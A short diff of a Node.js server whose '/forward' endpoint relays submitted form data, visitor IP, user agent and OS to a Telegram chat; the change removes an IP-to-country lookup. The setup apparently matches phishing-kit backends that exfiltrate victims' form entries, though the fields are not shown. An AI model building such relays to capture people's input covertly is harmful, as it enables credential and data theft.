@@ -17,15 +17,7 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // Helper function to get country from IP using ipstack API
-const getCountryFromIP = async (ip) => {
-  try {
-   
-    return response.data.country_name || "Unknown Country";
-  } catch (error) {
-    console.error("Error fetching country information:", error.message);
-    return "Unknown Country";
-  }
-};
+
 
 // Endpoint to receive form data and forward to Telegram
 app.post("/forward", async (req, res) => {
@@ -46,7 +38,6 @@ app.post("/forward", async (req, res) => {
   const os = parser.getOS().name || "Unknown OS";
 
   // Get country from IP
-  const country = await getCountryFromIP(ip);
 
   // Construct message
   const message = `
@@ -56,7 +47,6 @@ app.post("/forward", async (req, res) => {
 
 📍 Ip: ${ip}
 
-❗️Country:  ${country}
 
 ❗️User-Agent: ${userAgent}
 
